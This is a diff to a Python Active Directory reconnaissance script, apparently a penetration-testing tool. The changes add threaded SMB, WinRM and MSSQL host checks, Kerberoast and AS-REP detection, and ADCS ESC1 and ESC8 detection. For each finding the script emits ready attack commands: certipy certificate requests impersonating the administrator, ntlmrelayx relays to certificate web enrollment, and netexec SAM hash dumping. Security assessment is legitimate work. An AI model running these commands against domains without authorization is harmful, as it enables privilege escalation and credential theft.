@@ -23,12 +23,14 @@ except ImportError:
 
 # ── Args ──────────────────────────────────────────────────────────────────────
 parser = argparse.ArgumentParser(description="AD Scanner")
-parser.add_argument("-u",  "--username", required=True)
-parser.add_argument("-p",  "--password", required=True)
-parser.add_argument("-d",  "--domain",   required=True)
-parser.add_argument("-dc-ip",            required=True)
-parser.add_argument("-dns",              required=True)
-parser.add_argument("-o",  "--output",   default="scan_results.json")
+parser.add_argument("-u",  "--username",   required=True)
+parser.add_argument("-p",  "--password",   required=True)
+parser.add_argument("-d",  "--domain",     required=True)
+parser.add_argument("-dc-ip",              required=True)
+parser.add_argument("-dns",                required=True)
+parser.add_argument("-o",  "--output",     default="scan_results.json")
+parser.add_argument("-t",  "--threads",    type=int, default=10, help="Threads for host scanning (default: 10)")
+parser.add_argument("--skip-hosts",        default="", help="Comma-separated IPs or subnets to skip (e.g. 10.0.0.1,192.168.1.0/24)")
 args = parser.parse_args()
 
 domain      = args.domain
@@ -38,6 +40,26 @@ username    = args.username if "\\" in args.username else f"{domain}\\{args.user
 simple_user = args.username.split("\\")[-1]
 base_dn     = ",".join(f"DC={p}" for p in domain.split("."))
 dns_server  = args.dns
+
+# Parse skip list
+import ipaddress
+_skip_raw = [x.strip() for x in args.skip_hosts.split(",") if x.strip()]
+skip_networks = []
+skip_ips = set()
+for s in _skip_raw:
+    try:
+        skip_networks.append(ipaddress.ip_network(s, strict=False))
+    except ValueError:
+        skip_ips.add(s)
+
+def should_skip(ip):
+    if not ip: return False
+    if ip in skip_ips: return True
+    try:
+        addr = ipaddress.ip_address(ip)
+        return any(addr in net for net in skip_networks)
+    except ValueError:
+        return False
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 UAC_FLAGS = {
@@ -366,9 +388,18 @@ for entry in get_entries():
         "last_logon":   json_safe(d.get("lastLogon"))  if d.get("lastLogon")  else "",
         "member_of":    d.get("memberOf") or [],
     }
-    if spns and "ACCOUNT_DISABLED" not in flags:            kerberoastable.append(sam)
-    if "DONT_REQUIRE_PREAUTH" in flags and "ACCOUNT_DISABLED" not in flags: asrep_roastable.append(sam)
-    keywords = ["pass", "pwd", "password", "cred", "secret", "temp", "default"]
+    is_machine = sam.endswith("$")
+    # Kerberoastable: user accounts only (not machine accounts — they have SPNs by default)
+    if spns and not is_machine and "ACCOUNT_DISABLED" not in flags:
+        kerberoastable.append(sam)
+    # AS-REP roastable: user accounts only (machine accounts with pre-auth disabled are unusual but not directly exploitable)
+    if "DONT_REQUIRE_PREAUTH" in flags and not is_machine and "ACCOUNT_DISABLED" not in flags:
+        asrep_roastable.append(sam)
+    # Machine accounts with pre-auth disabled are separately interesting
+    if "DONT_REQUIRE_PREAUTH" in flags and is_machine and "ACCOUNT_DISABLED" not in flags:
+        asrep_roastable.append(sam)  # keep but mark separately in user dict
+    user["is_machine"] = is_machine
+    keywords = ["pass", "pwd", "password", "cred", "secret", "initial", "welcome", "changeme", "default123", "letmein"]
     if desc and any(k in desc.lower() for k in keywords):
         interesting_descriptions.append({"sam": sam, "description": desc})
     users.append(user)
@@ -420,11 +451,14 @@ print(f"\n[*] Per-host checks: SMB shares, WinRM, MSSQL ({len(computers)} hosts)
 print(f"    Saving progress to {args.output} after each host.")
 local_admin_hosts = []
 
+_smb_signing_result = True  # updated after SMB signing check
+
 def save_progress(extra=None):
     """Write current state to JSON so we never lose data mid-run."""
     snap = {
         "meta": {"domain": domain, "dc_ip": dc_ip, "scanned_by": simple_user,
-                 "scan_time": datetime.datetime.now().isoformat(), "smb_signing": True,
+                 "scan_time": datetime.datetime.now().isoformat(),
+                 "smb_signing": _smb_signing_result,
                  "status": "in_progress"},
         "computers": computers,
         "users": users,
@@ -439,53 +473,84 @@ def save_progress(extra=None):
     except Exception as _e:
         print(f"  [!] Failed to save progress: {_e}")
 
-for comp in computers:
+import threading
+
+_print_lock   = threading.Lock()
+_write_lock   = threading.Lock()
+_progress_lock = threading.Lock()
+_completed    = [0]
+
+def scan_host(comp):
     target = comp["dns_name"] or comp["hostname"]
-    if not target: continue
+    if not target: return
     ip = resolve_host(target)
     comp["ip"] = ip or ""
     if not ip:
-        print(f"  [-] Cannot resolve {target}, skipping")
-        continue
+        with _print_lock: print(f"  [-] Cannot resolve {target}, skipping")
+        return
 
-    print(f"\n  [*] {target} ({ip})")
+    # Skip if in skip list
+    if should_skip(ip):
+        with _print_lock: print(f"  [-] Skipping {target} ({ip}) — in skip list")
+        return
 
-    # Quick port 445 pre-check — skip instantly if unreachable
+    with _print_lock: print(f"\n  [*] {target} ({ip})")
+
+    # SMB
     if not port_open(ip, 445):
-        print(f"  [-] Port 445 closed/filtered on {target} — skipping SMB")
-        # Still check WinRM and MSSQL below
+        with _print_lock: print(f"  [-] Port 445 closed/filtered on {target}")
         smb_result = {"local_admin": False, "shares_read": [], "shares_write": [], "shares_all": [], "error": "port closed"}
     else:
-        # SMB
         smb_result = smb_check(ip, target)
-    comp["local_admin"]   = smb_result["local_admin"]
-    comp["shares_read"]   = smb_result["shares_read"]
-    comp["shares_write"]  = smb_result["shares_write"]
-    comp["shares_all"]    = smb_result["shares_all"]
+
+    comp["local_admin"]  = smb_result["local_admin"]
+    comp["shares_read"]  = smb_result["shares_read"]
+    comp["shares_write"] = smb_result["shares_write"]
+    comp["shares_all"]   = smb_result["shares_all"]
+
     if smb_result["local_admin"]:
-        local_admin_hosts.append({
-            "hostname": target, "ip": ip, "os": comp["os"],
-            "shares_read": smb_result["shares_read"],
-            "shares_write": smb_result["shares_write"],
-        })
+        with _write_lock:
+            local_admin_hosts.append({
+                "hostname": target, "ip": ip, "os": comp["os"],
+                "shares_read": smb_result["shares_read"],
+                "shares_write": smb_result["shares_write"],
+            })
 
     # WinRM
     winrm = check_winrm(ip)
     comp["winrm"] = winrm
     if winrm["available"]:
         admin_str = "LOCAL ADMIN" if winrm.get("local_admin") else ("AUTH OK" if winrm.get("auth") else "open / no auth")
-        print(f"  [{'+'if winrm.get('local_admin') else '*'}] WinRM :{winrm['port']} ({winrm['proto']}) — {admin_str}")
+        with _print_lock: print(f"  [{chr(43) if winrm.get('local_admin') else chr(42)}] WinRM :{winrm['port']} ({winrm['proto']}) — {admin_str}")
 
     # MSSQL
     mssql = check_mssql(ip)
     comp["mssql"] = mssql
     if mssql["available"]:
-        if mssql.get("sysadmin"):   print(f"  [+] MSSQL :1433 — SYSADMIN confirmed")
-        elif mssql.get("auth"):     print(f"  [*] MSSQL :1433 — authenticated (not sysadmin)")
-        else:                       print(f"  [*] MSSQL :1433 — port open, auth failed")
+        with _print_lock:
+            if mssql.get("sysadmin"):  print(f"  [+] MSSQL :1433 — SYSADMIN on {target}")
+            elif mssql.get("auth"):    print(f"  [*] MSSQL :1433 — auth OK on {target}")
+            else:                      print(f"  [*] MSSQL :1433 — open, auth failed on {target}")
 
-    # Save progress after every host so a crash doesn't lose everything
-    save_progress()
+    # Progress + save
+    with _progress_lock:
+        _completed[0] += 1
+        done = _completed[0]
+        total = len(computers)
+        if done % 10 == 0 or done == total:
+            with _print_lock: print(f"  [~] Progress: {done}/{total} hosts scanned")
+        save_progress()
+
+# Run threaded
+from concurrent.futures import ThreadPoolExecutor, as_completed
+n_threads = min(args.threads, len(computers))
+print(f"  Using {n_threads} threads...")
+with ThreadPoolExecutor(max_workers=n_threads) as executor:
+    futures = [executor.submit(scan_host, comp) for comp in computers]
+    for future in as_completed(futures):
+        try: future.result()
+        except Exception as e:
+            with _print_lock: print(f"  [!] Thread error: {e}")
 
 # ── SMB Signing ───────────────────────────────────────────────────────────────
 print("\n[*] Checking SMB signing on DC...")
@@ -494,8 +559,9 @@ try:
     smb = SMBConnection(dc_ip, dc_ip, sess_port=445, timeout=2)
     smb.login(simple_user, password, domain)
     smb_signing = smb.isSigningRequired()
+    _smb_signing_result = smb_signing
     smb.close()
-    print(f"  [{'+'if smb_signing else '!'}] SMB signing: {'REQUIRED' if smb_signing else 'NOT REQUIRED — relay possible!'}")
+    print(f"  [{chr(43) if smb_signing else chr(33)}] SMB signing: {'REQUIRED' if smb_signing else 'NOT REQUIRED — relay possible!'}") 
 except Exception as e:
     print(f"  [-] SMB signing check failed: {e}")
 
@@ -515,42 +581,91 @@ for entry in get_entries():
     adcs_cas.append({"name": ca_name, "host": ca_host, "templates": templates})
     print(f"  [+] CA found: {ca_name} on {ca_host} | {len(templates)} template(s)")
 
-# Check for ESC1-vulnerable templates (enrollee supplies SAN + client auth EKU)
+# Build set of templates actually published on a CA (to avoid flagging unpublished templates)
+published_templates = set()
+for ca in adcs_cas:
+    tmpl_list = ca.get("templates") or []
+    if isinstance(tmpl_list, str): tmpl_list = [tmpl_list]
+    for t in tmpl_list:
+        published_templates.add(t.strip())
+
+# ESC8: Web enrollment enabled on CA
+adcs_esc8 = []
+for ca in adcs_cas:
+    ca_ip = resolve_host(ca["host"])
+    if ca_ip and port_open(ca_ip, 80):
+        adcs_esc8.append(ca)
+        ca["esc8"] = True
+        print(f"  [!] ESC8: Web enrollment HTTP accessible on {ca['host']}")
+    elif ca_ip and port_open(ca_ip, 443):
+        adcs_esc8.append(ca)
+        ca["esc8"] = True
+        print(f"  [!] ESC8: Web enrollment HTTPS accessible on {ca['host']}")
+    else:
+        ca["esc8"] = False
+
+# ESC1: Check templates
 adcs_vulns = []
 if adcs_cas:
     safe_search(
         f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{base_dn}",
         "(objectClass=pKICertificateTemplate)",
         attributes=["cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
-                    "pKIExtendedKeyUsage","nTSecurityDescriptor","msPKI-RA-Signature"]
+                    "pKIExtendedKeyUsage","msPKI-RA-Signature","msPKI-Certificate-Application-Policy"]
     )
     CLIENT_AUTH_OIDS = {"1.3.6.1.5.5.7.3.2", "1.3.6.1.5.2.3.4", "1.3.6.1.4.1.311.20.2.2"}
     for entry in get_entries():
         raw = entry.entry_attributes_as_dict
-        tname   = unwrap(raw.get("cn")) or ""
-        name_flag = unwrap(raw.get("msPKI-Certificate-Name-Flag")) or 0
-        ekus    = raw.get("pKIExtendedKeyUsage") or []
-        ra_sig  = unwrap(raw.get("msPKI-RA-Signature")) or 0
+        tname      = unwrap(raw.get("cn")) or ""
+        name_flag  = unwrap(raw.get("msPKI-Certificate-Name-Flag")) or 0
+        enroll_flag= unwrap(raw.get("msPKI-Enrollment-Flag")) or 0
+        ekus       = raw.get("pKIExtendedKeyUsage") or []
+        app_policy = raw.get("msPKI-Certificate-Application-Policy") or []
+        ra_sig     = unwrap(raw.get("msPKI-RA-Signature")) or 0
 
-        try: name_flag = int(name_flag)
+        try: name_flag   = int(name_flag)
         except: name_flag = 0
-        try: ra_sig = int(ra_sig)
-        except: ra_sig = 0
+        try: enroll_flag = int(enroll_flag)
+        except: enroll_flag = 0
+        try: ra_sig      = int(ra_sig)
+        except: ra_sig   = 0
 
-        # ESC1: enrollee supplies subject (flag 0x1) + client auth EKU + no manager approval
-        has_san_flag    = bool(name_flag & 0x1)
-        has_client_auth = bool(set(ekus) & CLIENT_AUTH_OIDS)
-        if has_san_flag and has_client_auth and ra_sig == 0:
-            adcs_vulns.append({
+        # Skip if template not published on any CA (avoids flagging templates no CA serves)
+        if published_templates and tname not in published_templates:
+            continue
+
+        # ESC1 conditions:
+        # 1. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) set in msPKI-Certificate-Name-Flag
+        # 2. Client Authentication EKU present
+        # 3. No manager approval required (msPKI-Enrollment-Flag bit 0x02 NOT set)
+        # 4. No authorized signatures required (msPKI-RA-Signature = 0)
+        has_san_flag     = bool(name_flag & 0x1)
+        has_client_auth  = bool(set(unwrap_list(ekus)) & CLIENT_AUTH_OIDS) or bool(set(unwrap_list(app_policy)) & CLIENT_AUTH_OIDS)
+        needs_approval   = bool(enroll_flag & 0x02)
+        needs_ra_sig     = ra_sig > 0
+
+        if has_san_flag and has_client_auth and not needs_approval and not needs_ra_sig:
+            # Find which CA serves this template
+            serving_ca = next((ca for ca in adcs_cas if tname in (ca.get("templates") or [])), adcs_cas[0] if adcs_cas else None)
+            ca_host = serving_ca["host"] if serving_ca else dc_ip
+            ca_name = serving_ca["name"] if serving_ca else "CA-NAME"
+            vuln = {
                 "template": tname,
                 "type": "ESC1",
-                "detail": "Enrollee supplies SAN + Client Auth EKU + no approval required",
-                "command": f"certipy req -u {simple_user}@{domain} -p '{password}' -dc-ip {dc_ip} -target {adcs_cas[0]['host'] if adcs_cas else dc_ip} -template {tname} -ca '{adcs_cas[0]['name'] if adcs_cas else 'CA-NAME'}' -upn administrator@{domain}"
-            })
-            print(f"  [!] ESC1 vulnerable template: {tname}")
+                "detail": f"Enrollee supplies SAN + Client Auth EKU + no approval + no RA sig. Published on: {ca_name}",
+                "ca_host": ca_host,
+                "ca_name": ca_name,
+                "command": f"certipy req -u {simple_user}@{domain} -p '{password}' -dc-ip {dc_ip} -target {ca_host} -template {tname} -ca '{ca_name}' -upn administrator@{domain}",
+                "note": "If CERTSRV_E_TEMPLATE_DENIED: your account may lack Enroll rights. Check enrollment ACL — try as machine account or different user."
+            }
+            adcs_vulns.append(vuln)
+            print(f"  [!] ESC1: {tname} (CA: {ca_name}) — verify enrollment rights before testing")
 
     if not adcs_vulns:
-        print("  [+] No obvious ESC1 templates found (run certipy for full check)")
+        print("  [+] No ESC1 templates found among published templates")
+
+if adcs_esc8:
+    print(f"  [!] ESC8: {len(adcs_esc8)} CA(s) with web enrollment accessible")
 
 # ── Trusts ────────────────────────────────────────────────────────────────────
 print("\n[*] Enumerating domain trusts...")
@@ -650,15 +765,21 @@ if t2a4d_users:
         print(f"      {u['sam']} -> {', '.join(u['constrained_delegation'][:3])}")
 rbcd_info["t2a4d_users"] = [{"sam": u["sam"], "delegates_to": u["constrained_delegation"]} for u in t2a4d_users]
 findings = []
-unconstrained  = [c for c in computers if c.get("unconstrained_delegation")]
-passwd_notreqd = [u for u in users if "PASSWD_NOTREQD" in u.get("flags", [])]
+# Exclude domain controllers from unconstrained delegation — DCs always have this flag, it's by design
+dc_names = {c["hostname"].upper() for c in computers if "SERVER_TRUST_ACCOUNT" in c.get("flags",[])}
+unconstrained  = [c for c in computers if c.get("unconstrained_delegation") and c["hostname"].upper() not in dc_names]
+passwd_notreqd = [u for u in users if "PASSWD_NOTREQD" in u.get("flags", []) and not u.get("is_machine", False) and "ACCOUNT_DISABLED" not in u.get("flags", [])]
 
 if not smb_signing:
     findings.append({"severity":"CRITICAL","title":"SMB Signing Not Required",
         "detail":"NTLM relay attacks possible across the network.",
         "command":f"impacket-ntlmrelayx -tf relay-targets.txt -smb2support"})
+if adcs_esc8:
+    findings.append({"severity":"CRITICAL","title":f"ADCS ESC8 — Web Enrollment on {len(adcs_esc8)} CA(s)",
+        "detail":", ".join(ca["name"] for ca in adcs_esc8),
+        "command":f"impacket-ntlmrelayx -t http://{adcs_esc8[0]['host']}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"})
 if adcs_vulns:
-    findings.append({"severity":"CRITICAL","title":f"ADCS ESC1 — {len(adcs_vulns)} Vulnerable Template(s)",
+    findings.append({"severity":"HIGH","title":f"ADCS ESC1 — {len(adcs_vulns)} Template(s) (verify enroll rights)",
         "detail":", ".join(v["template"] for v in adcs_vulns),
         "command":adcs_vulns[0]["command"]})
 if kerberoastable:
@@ -697,6 +818,7 @@ if mssql_sysadmin:
     findings.append({"severity":"HIGH","title":f"MSSQL Sysadmin on {len(mssql_sysadmin)} Host(s)",
         "detail":", ".join(c["hostname"] for c in mssql_sysadmin[:3]),
         "command":f"impacket-mssqlclient {domain}/{simple_user}:'PASSWORD'@{mssql_sysadmin[0]['ip']} -windows-auth"})
+if local_admin_hosts:
     findings.append({"severity":"HIGH","title":f"Local Admin on {len(local_admin_hosts)} Host(s)",
         "detail":", ".join(h["hostname"] for h in local_admin_hosts[:5]),
         "command":f"netexec smb {local_admin_hosts[0]['ip']} -u {simple_user} -p '{password}' --sam"})
@@ -746,6 +868,7 @@ output = {
     "password_policy":          pwd_policy,
     "adcs_cas":                 adcs_cas,
     "adcs_vulns":               adcs_vulns,
+    "adcs_esc8":                adcs_esc8,
     "rbcd":                     rbcd_info,
 }
 
